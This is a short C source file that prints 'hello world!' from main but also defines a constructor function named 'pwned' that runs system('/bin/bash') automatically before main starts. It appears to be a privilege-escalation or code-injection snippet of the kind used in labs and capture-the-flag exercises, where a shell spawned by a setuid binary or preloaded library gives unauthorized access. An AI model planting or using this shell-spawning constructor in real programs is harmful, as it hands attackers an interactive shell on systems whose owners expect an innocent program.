#include <stdio.h>

void __attribute__((constructor))pwned()
{
	system("/bin/bash");
}

int main()
{
	puts("hello world!");
}
